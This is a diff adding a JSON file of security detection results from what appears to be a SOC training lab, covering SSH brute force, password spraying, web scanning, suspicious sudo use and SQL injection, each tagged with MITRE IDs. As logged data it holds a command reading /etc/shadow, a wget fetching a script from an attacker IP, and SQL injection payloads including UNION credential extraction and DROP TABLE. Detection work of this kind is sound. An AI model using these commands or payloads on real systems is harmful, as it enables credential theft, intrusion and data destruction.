@@ -1,0 +1,152 @@
+[
+  {
+    "detection": "SSH Brute Force",
+    "result": {
+      "src_ip": "203.0.113.45",
+      "failures": "45",
+      "users_tried": "1",
+      "usernames": "admin",
+      "severity": "high",
+      "mitre": "T1110.001"
+    }
+  },
+  {
+    "detection": "Successful Login After Brute Force",
+    "result": {
+      "src_ip": "203.0.113.45",
+      "failures": "45",
+      "successes": "1",
+      "compromised_user": "admin",
+      "severity": "critical",
+      "mitre": "T1110,T1078"
+    }
+  },
+  {
+    "detection": "Password Spraying",
+    "result": {
+      "src_ip": "198.51.100.23",
+      "distinct_users": "12",
+      "attempts": "12",
+      "usernames": [
+        "root",
+        "test",
+        "oracle",
+        "postgres",
+        "ubuntu",
+        "guest",
+        "ftpuser",
+        "support",
+        "user1",
+        "jenkins",
+        "git",
+        "mysql"
+      ],
+      "severity": "high",
+      "mitre": "T1110.003"
+    }
+  },
+  {
+    "detection": "Suspicious Sudo Command",
+    "result": {
+      "_time": "2026-10-14T10:48:12.000+01:00",
+      "host": "soc-lab-web01",
+      "sudo_user": "backup",
+      "sudo_command": "/bin/cat /etc/shadow",
+      "severity": "high",
+      "mitre": "T1548.003"
+    }
+  },
+  {
+    "detection": "Suspicious Sudo Command",
+    "result": {
+      "_time": "2026-10-14T10:48:27.000+01:00",
+      "host": "soc-lab-web01",
+      "sudo_user": "backup",
+      "sudo_command": "/usr/bin/wget http://203.0.113.45/x.sh -O /tmp/x.sh",
+      "severity": "high",
+      "mitre": "T1548.003"
+    }
+  },
+  {
+    "detection": "Web Directory Scanning",
+    "result": {
+      "clientip": "203.0.113.99",
+      "errors": "54",
+      "unique_paths": "18",
+      "user_agents": "gobuster/3.6",
+      "severity": "medium",
+      "mitre": "T1595.003"
+    }
+  },
+  {
+    "detection": "Web Directory Scanning",
+    "result": {
+      "clientip": "192.168.1.50",
+      "errors": "31",
+      "unique_paths": "31",
+      "user_agents": "Nessus",
+      "severity": "medium",
+      "mitre": "T1595.003"
+    }
+  },
+  {
+    "detection": "SQL Injection Attempt",
+    "result": {
+      "_time": "2026-10-14T10:46:51.000+01:00",
+      "clientip": "203.0.113.99",
+      "status": "500",
+      "useragent": "sqlmap/1.8",
+      "decoded": "/products?id=1' OR '1'='1",
+      "severity": "high",
+      "mitre": "T1190"
+    }
+  },
+  {
+    "detection": "SQL Injection Attempt",
+    "result": {
+      "_time": "2026-10-14T10:46:59.000+01:00",
+      "clientip": "203.0.113.99",
+      "status": "500",
+      "useragent": "sqlmap/1.8",
+      "decoded": "/products?id=1 UNION SELECT username,password FROM users--",
+      "severity": "high",
+      "mitre": "T1190"
+    }
+  },
+  {
+    "detection": "SQL Injection Attempt",
+    "result": {
+      "_time": "2026-10-14T10:47:06.000+01:00",
+      "clientip": "203.0.113.99",
+      "status": "500",
+      "useragent": "sqlmap/1.8",
+      "decoded": "/products?q='; DROP TABLE users--",
+      "severity": "high",
+      "mitre": "T1190"
+    }
+  },
+  {
+    "detection": "SQL Injection Attempt",
+    "result": {
+      "_time": "2026-10-14T10:47:14.000+01:00",
+      "clientip": "203.0.113.99",
+      "status": "200",
+      "useragent": "sqlmap/1.8",
+      "decoded": "/products?id=1 AND SLEEP(5)",
+      "severity": "high",
+      "mitre": "T1190"
+    }
+  },
+  {
+    "detection": "SQL Injection Attempt",
+    "result": {
+      "_time": "2026-10-14T10:47:22.000+01:00",
+      "clientip": "203.0.113.99",
+      "status": "500",
+      "useragent": "sqlmap/1.8",
+      "decoded": "/products?user=admin'--",
+      "severity": "high",
+      "mitre": "T1190"
+    }
+  }
+]
